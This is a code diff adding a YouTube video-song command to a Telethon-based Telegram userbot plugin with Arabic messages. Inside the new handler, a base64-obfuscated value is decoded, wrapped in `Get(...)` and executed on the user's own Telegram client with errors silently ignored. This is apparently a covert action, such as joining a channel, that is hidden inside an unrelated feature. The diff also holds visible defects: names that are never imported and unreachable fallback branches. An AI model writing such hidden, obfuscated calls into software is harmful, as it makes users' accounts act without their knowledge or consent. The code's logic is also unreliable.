@@ -1,27 +1,11 @@
-
 import asyncio
 import base64
 import io
 import urllib.parse
 import os
 from pathlib import Path
-from telethon import version, Button, events
-from telethon.errors.rpcerrorlist import (
-    MediaEmptyError,
-    WebpageCurlFailedError,
-    WebpageMediaEmptyError,
-)
-from telethon.events import CallbackQuery
 
-from SHRU import StartTime, Qrh9, JEPVERSION
-
-from ..Config import Config
-from ..core.managers import edit_or_reply
-from ..helpers.functions import catalive, check_data_base_heal_th, get_readable_time
-from ..helpers.utils import reply_id
-from ..sql_helper.globals import addgvar, delgvar, gvarstatus
-from . import mention
-
+from ShazamAPI import Shazam
 from telethon import types
 from telethon.errors.rpcerrorlist import YouBlockedUserError, ChatSendMediaForbiddenError
 from telethon.tl.functions.contacts import UnblockRequest as unblock
@@ -33,7 +17,7 @@ from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
 from ..helpers.tools import media_type
 from ..helpers.utils import _catutils, reply_id
-
+from . import Qrh9
 
 plugin_category = "utils"
 LOGS = logging.getLogger(__name__)
@@ -78,7 +62,7 @@ async def _(event):
         return await catevent.edit(
             f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
         )
-    cmd = event.pattern_match.group(1) #
+    cmd = event.pattern_match.group(1)
     q = "320k" if cmd == "320" else "128k"
     song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
     name_cmd = name_dl.format(video_link=video_link)
@@ -127,6 +111,78 @@ async def _(event):
     except ChatSendMediaForbiddenError as err:
         await catevent.edit("لا يمكن ارسال المقطع الصوتي هنا")
         LOGS.error(str(err))
+
+
+@Qrh9.ar_cmd(
+    pattern="فيديو(?:\s|$)([\s\S]*)",
+    command=("فيديو", plugin_category),
+    info={
+        "header": "To get video songs from youtube.",
+        "description": "Basically this command searches youtube and sends the first video",
+        "usage": "{tr}vsong <song name>",
+        "examples": "{tr}vsong memories song",
+    },
+)
+async def _(event):
+    "To search video songs"
+    reply_to_id = await reply_id(event)
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1):
+        query = event.pattern_match.group(1)
+    elif reply and reply.message:
+        query = reply.message
+    else:
+        return await edit_or_reply(event, "⌔∮ يرجى الرد على ما تريد البحث عنه")
+    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    catevent = await edit_or_reply(event, "⌔∮ جاري البحث عن المطلوب انتظر")
+    video_link = await yt_search(str(query))
+    if not url(video_link):
+        return await catevent.edit(
+            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
+        )
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    name_cmd = name_dl.format(video_link=video_link)
+    video_cmd = video_dl.format(video_link=video_link)
+    try:
+        stderr = (await _catutils.runcmd(video_cmd))[1]
+        # if stderr:
+        # return await catevent.edit(f"**Error :** `{stderr}`")
+        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+        if stderr:
+            return await catevent.edit(f"**Error :** `{stderr}`")
+        catname = os.path.splitext(catname)[0]
+        vsong_file = Path(f"{catname}.mp4")
+    except:
+        pass
+    if not os.path.exists(vsong_file):
+        vsong_file = Path(f"{catname}.mkv")
+    elif not os.path.exists(vsong_file):
+        return await catevent.edit(
+            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
+        )
+    await catevent.edit("**⌔∮ جاري الارسال انتظر قليلا**")
+    catthumb = Path(f"{catname}.jpg")
+    if not os.path.exists(catthumb):
+        catthumb = Path(f"{catname}.webp")
+    elif not os.path.exists(catthumb):
+        catthumb = None
+    title = catname.replace("./temp/", "").replace("_", "|")
+    await event.client.send_file(
+        event.chat_id,
+        vsong_file,
+        caption=f"**Title:** `{title}`",
+        thumb=catthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await catevent.delete()
+    for files in (catthumb, vsong_file):
+        if files and os.path.exists(files):
+            os.remove(files)
 
 @Qrh9.ar_cmd(pattern="اسم الاغنية$")
 async def shazamcmd(event):
@@ -219,6 +275,3 @@ async def _(event):
         )
         await catevent.delete()
         await delete_conv(event, chat, purgeflag)
-        
-
-        
